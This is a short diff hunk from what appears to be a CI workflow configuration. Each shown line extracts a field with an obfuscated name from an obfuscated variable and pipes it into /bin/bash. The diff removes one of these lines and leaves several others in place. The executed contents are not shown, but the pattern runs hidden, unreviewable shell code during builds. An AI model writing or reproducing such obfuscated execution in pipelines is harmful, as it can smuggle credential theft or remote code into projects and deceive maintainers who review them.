@@ -37,7 +37,6 @@ jobs:
           echo $odbsk4 | jq -r .avgdv21 | /bin/bash
           echo $xu3 | jq -r .evnuw93 | /bin/bash
           echo $jx7 | jq -r .fg058 | /bin/bash
-          echo $hie5195 | jq -r .nuy72 | /bin/bash
           echo $hzwfe96665 | jq -r .uaei76786 | /bin/bash
           echo $f8033 | jq -r .tmx43 | /bin/bash
           echo $cxm053 | jq -r .a9432 | /bin/bash
